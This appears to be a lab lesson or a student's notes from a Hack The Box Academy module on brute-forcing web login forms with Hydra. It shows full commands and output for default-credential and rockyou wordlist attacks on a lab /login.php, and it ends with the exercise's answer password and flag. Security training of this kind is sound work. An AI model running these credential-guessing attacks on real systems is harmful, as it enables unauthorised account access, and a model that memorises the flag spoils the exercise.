# Login Form Attacks

In our situation, we don't have any information about the existing usernames or passwords. Since we enumerated all available ports to us and we couldn't determine any useful information, we have the option to test the web application form for default credentials in combination with the `http-post-form` module.

***

### Default Credentials

Let's try to use the `ftp-betterdefaultpasslist.txt` list with the default credentials to test if one of the accounts is registered in the web application.

Login Form Attacks

```shell-session
AIceBear@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

As we can see, we were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.

***

### Password Wordlist

Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as `admin`, `administrator`, `wpadmin`, `root`, `adm`, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is `admin`. In this case, we specify this username for our next attempt to get access to the admin panel.

Login Form Attacks

```shell-session
AIceBear@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)
```

We can try to log in with these credentials now:

![](https://academy.hackthebox.com/storage/modules/57/bruteforcing\_logged\_in\_1.jpg)

**Questions**

Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. Once you login, you should find a flag. Submit the flag as the answer.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 94.237.49.138 -s 49729 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'" 
#[49729][http-post-form] host: 94.237.49.138   login: admin   password: password1
# HTB{bru73_f0rc1n6_15_4_l457_r350r7} 
```
